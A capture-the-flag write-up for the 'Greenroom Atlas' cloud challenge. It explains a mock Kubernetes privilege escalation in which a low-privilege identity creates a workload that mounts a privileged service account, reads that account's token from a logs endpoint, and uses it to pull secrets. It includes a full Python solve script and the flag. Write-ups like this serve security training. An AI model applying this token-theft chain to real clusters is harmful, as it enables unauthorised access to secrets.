---
title: "Greenroom Atlas"
ctf: "Safaricom CTF"
date: 2026-10-06
category: cloud
difficulty: hard
points: 750
flag_format: "safctf{...}"
author: "Strawhats"
---

# Greenroom Atlas

> **Category:** CLOUD · **Points:** 750 · **Difficulty:** hard

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: http://54.72.82.22:8410 (Werkzeug 3.1.9 / Python 3.11.16, Flask).

## Surface

Index page + `GET /downloads/cluster.json` handed over the whole trust model:

```json
{
  "namespace": "backstage",
  "bindings":        { "tour-bot":      ["get:workloads", "patch:rolebindings"] },
  "roles":           { "editor":        ["create:workloads", "get:workloads/logs"] },
  "serviceAccounts": { "default":       ["read:public"],
                       "archive-agent": ["get:secrets"] }
}
```

Endpoints (from the desk-services note on the index and probing):

| Method | Path | Auth | Notes |
|---|---|---|---|
| POST | `/api/login` | none | returns `{"namespace":"backstage","token":"tour-bot"}` for any body |
| POST | `/api/workloads` | Bearer | body `{"spec":{...}}`, returns `{"name":"<16 hex>"}` |
| GET  | `/api/workloads/<name>/logs` | Bearer | returns `{"lines":[...]}` or `{"token":"<sa>"}` |
| PATCH| `/api/bindings` | Bearer | accepts `roleRef` (403 with tour-bot) |
| GET  | `/api/secrets` | Bearer | 403 without `get:secrets` |

## Exploit chain

This is a fake-Kubernetes RBAC puzzle (sibling of Stageworks :8400 but *not*
an AssumeRole/external-ID flow — no AWS anywhere).

1. `POST /api/login` → identity `tour-bot` (can create workloads + read logs).
2. `POST /api/workloads` with a spec that mounts a **different** service
   account and enables token automounting:

   ```json
   {"spec": {"serviceAccountName": "archive-agent",
             "automountServiceAccountToken": true}}
   ```

3. `GET /api/workloads/<name>/logs` — the workload's projected service-account
   token is echoed in the "logs": `{"token":"archive-agent"}`.
4. `GET /api/secrets` with `Authorization: Bearer archive-agent` → flag.

## The gate (extra stage over a naive read)

`automountServiceAccountToken: true` is required. Verified:

| spec | logs result |
|---|---|
| `archive-agent`, no automount key | `{"lines":["Ready."]}` |
| `archive-agent`, `automount...: false` | `{"lines":["Ready."]}` |
| `default`, `automount...: true` | `{"lines":["Ready."]}` (default only has `read:public`) |
| `archive-agent`, `automount...: true` | `{"token":"archive-agent"}` |

So the leak only fires for the privileged SA *and* only when the pod spec asks
for the token. `PATCH /api/bindings` (tour-bot's `patch:rolebindings`) returns
403 and was not needed — the flag is reached without it.

## Reproduce

```bash
python3 solve.py http://54.72.82.22:8410
```

## Solve script

`cloud/greenroom-atlas/solve.py`:

```python
#!/usr/bin/env python3
"""Greenroom Atlas (CLOUD, 750 pts) — Safaricom CTF.

Chain: /api/login mints the `tour-bot` identity (get:workloads,
patch:rolebindings). Create a workload whose spec automounts the
`archive-agent` service account (automountServiceAccountToken=true); the
per-workload logs endpoint then hands back that service account's token.
`archive-agent` holds get:secrets, so GET /api/secrets returns the flag.

Usage: python3 solve.py [target]
"""
import re
import sys

import requests


def main(target):
    t = target.rstrip("/")
    s = requests.Session()

    # 1) mint the tour-bot identity
    r = s.post(f"{t}/api/login", json={}, timeout=15)
    r.raise_for_status()
    tok = r.json()["token"]
    print(f"[+] login token: {tok}")
    h = {"Authorization": f"Bearer {tok}"}

    # 2) create a workload that automounts the archive-agent service account
    spec = {
        "spec": {
            "serviceAccountName": "archive-agent",
            "automountServiceAccountToken": True,
        }
    }
    r = s.post(f"{t}/api/workloads", json=spec, headers=h, timeout=15)
    r.raise_for_status()
    name = r.json()["name"]
    print(f"[+] workload: {name}")

    # 3) the logs endpoint leaks the projected service-account token
    r = s.get(f"{t}/api/workloads/{name}/logs", headers=h, timeout=15)
    r.raise_for_status()
    sa = r.json()["token"]
    print(f"[+] service account token: {sa}")

    # 4) archive-agent can read secrets
    r = s.get(
        f"{t}/api/secrets",
        headers={"Authorization": f"Bearer {sa}"},
        timeout=15,
    )
    r.raise_for_status()
    msg = r.json()["message"]
    print(f"[+] secrets: {msg}")
    return msg


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8410"
    out = main(target)
    m = re.search(r"safctf\{[0-9a-f]{32}\}", out)
    print("\nFLAG:", m.group(0) if m else "NOT FOUND")
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- aws CLI + Pacu (AWS exploitation)
- kubectl (K8s API)
- ScoutSuite / Prowler (posture)
- kube-hunter

## Flag

```
safctf{6035ffad158ce604cb84927b77926d47}
```
